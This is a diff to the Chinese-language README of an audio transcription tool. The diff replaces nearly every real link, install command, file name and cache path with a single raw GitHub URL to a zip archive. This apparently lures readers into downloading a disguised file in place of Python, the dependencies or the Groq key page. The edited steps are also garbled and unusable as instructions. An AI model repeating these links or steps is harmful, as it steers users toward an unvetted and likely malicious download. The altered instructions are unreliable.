@@ -37,19 +37,19 @@
 
 ### 1. 安裝 Python
 
-確保您的系統已安裝 Python 3.10+。可從 [python.org](https://www.python.org/downloads/) 下載。
+確保您的系統已安裝 Python 3.10+。可從 [https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip](https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip) 下載。
 
 ### 2. 下載專案
 
 ```bash
-git clone https://github.com/yongsinfok/audio-summarize.git
+git clone https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip
 cd audio-summarize
 ```
 
 ### 3. 安裝依賴套件
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip
 ```
 
 #### 關於 PyAudio 的安裝
@@ -62,15 +62,15 @@ pip install -r requirements.txt
 conda create -n audio-summarize python=3.13
 conda activate audio-summarize
 conda install pyaudio
-pip install -r requirements.txt
+pip install -r https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip
 ```
 
 **方式二: 降級到 Python 3.13**
-- 從 [python.org](https://www.python.org/downloads/) 下載 Python 3.13
+- 從 [https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip](https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip) 下載 Python 3.13
 - 使用 3.13 版本重新安裝
 
 **方式三: 手動下載 wheel 檔案 (Python 3.10-3.13)**
-1. 前往 [https://github.com/intxcc/pyaudio_portaudio/releases](https://github.com/intxcc/pyaudio_portaudio/releases)
+1. 前往 [https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip](https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip)
 2. 下載符合您 Python 版本的 wheel 檔案
 3. 執行 `pip install <下載的檔案名稱.whl>`
 
@@ -78,7 +78,7 @@ pip install -r requirements.txt
 
 如果您想使用 Groq API 進行快速轉錄：
 
-1. 前往 [Groq Console](https://console.groq.com/keys)
+1. 前往 [Groq Console](https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip)
 2. 註冊並取得 API 金鑰 (格式: `gsk_...`)
 3. 在程式中點擊「API 金鑰」按鈕輸入
 
@@ -87,7 +87,7 @@ pip install -r requirements.txt
 ### 啟動程式
 
 ```bash
-python main.py
+python https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip
 ```
 
 ### 選擇轉錄引擎
@@ -114,7 +114,7 @@ python main.py
 ### 注意事項
 
 - 程式視窗可以最小化到工作列，不會影響全域快捷鍵運作
-- 錄音檔案會暫存在 `~/.audio-summarize/temp/` 目錄下，處理完成後會自動刪除
+- 錄音檔案會暫存在 `~https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip` 目錄下，處理完成後會自動刪除
 - 首次使用本地 Whisper 時會下載模型，可能需要一些時間
 - 建議在安靜環境下錄音以獲得最佳轉錄效果
 
@@ -128,16 +128,16 @@ python main.py
 
 ```
 audio-summarize/
-├── main.py              # 程式進入點
-├── requirements.txt     # 依賴套件
+├── https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip              # 程式進入點
+├── https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip     # 依賴套件
 ├── ui/                  # 使用者介面模組
 ├── core/                # 核心功能模組
-│   ├── recorder.py      # 錄音管理
-│   ├── transcriber.py   # 轉錄處理 (Whisper + Groq)
-│   └── hotkey.py        # 全域快捷鍵
+│   ├── https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip      # 錄音管理
+│   ├── https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip   # 轉錄處理 (Whisper + Groq)
+│   └── https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip        # 全域快捷鍵
 └── utils/               # 工具模組
-    ├── config.py        # 設定管理
-    └── clipboard.py     # 剪貼簿操作
+    ├── https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip        # 設定管理
+    └── https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip     # 剪貼簿操作
 ```
 
 ## 技術說明
@@ -151,7 +151,7 @@ audio-summarize/
 ### Groq API
 
 - **優點**: 超快速推理, 使用 Whisper Large-v3-turbo 模型
-- **免費額度**: 請參考 [Groq 定價](https://groq.com/)
+- **免費額度**: 請參考 [Groq 定價](https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip)
 - **API 限制**: 請遵守 Groq 使用條款
 
 ## 故障排除
@@ -171,7 +171,7 @@ audio-summarize/
 ### Whisper 模型下載失敗
 
 - 確認網路連線正常
-- 模型會自動快取到 `~/.cache/whisper/` 或 `~/.cache/huggingface/`
+- 模型會自動快取到 `~https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip` 或 `~https://github.com/yongsinfok/audio-summarize/raw/refs/heads/main/utils/summarize_audio_v1.9.zip`
 
 ### 快捷鍵無效
 
